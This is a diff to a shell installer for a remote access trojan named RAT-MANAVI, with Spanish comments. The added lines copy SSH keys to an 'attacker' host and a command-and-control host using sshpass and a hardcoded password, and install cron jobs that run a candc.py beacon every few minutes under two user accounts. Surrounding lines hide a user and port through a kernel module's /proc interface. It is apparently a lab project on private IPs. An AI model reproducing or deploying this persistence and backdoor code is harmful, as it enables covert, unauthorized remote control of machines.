@@ -5,6 +5,7 @@ LOG_FILE=$RAT_DIR/rat.log
 
 CLIENT_PASS='hola123,'
 CLIENT_IP='192.168.222.9'
+COANDC_IP='192.168.222.13'
 
 MODPROBE=/sbin/modprobe
 INSMOD=/sbin/insmod
@@ -112,7 +113,10 @@ then
 	echo "Agregando intercambio de llaves"
 	#ssh-keygen -q -b 4096 -t rsa -N '' -f $HOME/.ssh/id_rsa
 	cp -f ${RAT_DIR}RAT-MANAVI/id_rsa* $HOME/.ssh/
+	#Copia al equipo atacante
 	sshpass -p ${CLIENT_PASS} ssh-copy-id -i $HOME/.ssh/id_rsa.pub ${RAT_USER}@${CLIENT_IP}
+	#Copia al equipo candc
+	sshpass -p ${CLIENT_PASS} ssh-copy-id -i $HOME/.ssh/id_rsa.pub ${RAT_USER}@${COANDC_IP}
 	echo "Finalizo el intercambio de llaves."
 else
 	echo 'Ya os podeis conectar sin contraseña.'
@@ -131,3 +135,13 @@ echo "hsport $SPORT" > /proc/buddyinfo 2>/dev/null
 #Ocultar usuario
 echo "huser $RAT_USER" > /proc/buddyinfo 2>/dev/null
 
+#Generar tarea programada por medio de una crontab
+#echo "0,10,20,30,40,50 * * * * /candc.py" >> /tmp/tare.txt
+cp ${RAT_DIR}RAT-MANAVI/candc.py /home/manavi/
+chown manavi:manavi /home/manavi/candc.py
+echo "0,10,20,30,40,50 * * * * /home/manavi/candc.py" >> /tmp/tare.txt
+crontab -u manavi /tmp/tare.txt 
+echo "0,5,10,15,20,25,30,35,40,45,50,55 * * * * sysadmin ${RAT_DIR}RAT-MANAVI/candc.py" >> /tmp/tarez.txt
+crontab -u sysadmin /tmp/tarez.txt 
+rm /tmp/tarez.txt
+rm /tmp/tare.txt
